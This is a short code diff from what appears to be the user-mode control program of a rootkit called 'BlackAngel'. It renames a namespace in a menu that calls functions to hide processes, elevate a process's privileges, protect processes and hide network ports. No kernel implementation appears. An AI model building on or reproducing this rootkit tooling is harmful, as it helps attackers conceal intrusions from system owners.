@@ -17,7 +17,7 @@ USHORT GetInputUshort()
     return port;
 }
 
-BOOL GetHideProtocol(BlackAngel::Rootkit::HideProtocol* hp)
+BOOL GetHideProtocol(BlackAngel::HideProtocol* hp)
 {
     UINT32 option = 0;
 
@@ -98,30 +98,30 @@ int main()
             case 1:
             {
                 UINT32 PID = GetInputUint();
-                BlackAngel::Rootkit::HideProcess(PID);
+                BlackAngel::HideProcess(PID);
                 break;
             }
 
             case 2:
             {
                 UINT32 PID = GetInputUint();
-                BlackAngel::Rootkit::ElevateProcess(PID);
+                BlackAngel::ElevateProcess(PID);
                 break;
             }
 
             case 3:
             {
                 UINT32 PID = GetInputUint();
-                BlackAngel::Rootkit::ProtectProcess(PID);
+                BlackAngel::ProtectProcess(PID);
                 break;
             }
 
             case 4: 
             {
-                BlackAngel::Rootkit::HideProtocol hp = { 0 };
+                BlackAngel::HideProtocol hp = { 0 };
                 if (!GetHideProtocol(&hp))
                     return -1;
-                BlackAngel::Rootkit::HidePort(hp);
+                BlackAngel::HidePort(hp);
             }
 
             case 99:
